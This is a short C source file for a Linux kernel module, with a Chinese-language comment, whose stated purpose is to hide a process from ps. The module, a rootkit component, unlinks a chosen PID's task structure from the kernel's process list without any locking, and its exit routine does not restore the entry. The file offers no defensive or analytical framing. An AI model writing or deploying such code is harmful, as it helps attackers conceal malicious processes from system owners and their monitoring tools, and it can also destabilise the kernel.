#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Snowwolf");
MODULE_DESCRIPTION("Hides a process from ps");

static int pid_to_hide = 1234; //替换为隐藏的进程PID
module_param(pid_to_hide, int, 0644);
MODULE_PARM_DESC(pid_to_hide, "PID of the process to hide");

static int __init hide_process_init(void) {
    struct task_struct *task;

    printk(KERN_INFO "Hiding process with PID: %d\n", pid_to_hide);

    for_each_process(task) {
        if (task->pid == pid_to_hide) {
            list_del(&task->tasks);
            printk(KERN_INFO "Process with PID %d hidden.\n", pid_to_hide);
            break;
        }
    }

    return 0;
}

static void __exit hide_process_exit(void) {
    printk(KERN_INFO "Unhiding process (if possible).  Reboot recommended.\n");
}

module_init(hide_process_init);
module_exit(hide_process_exit);
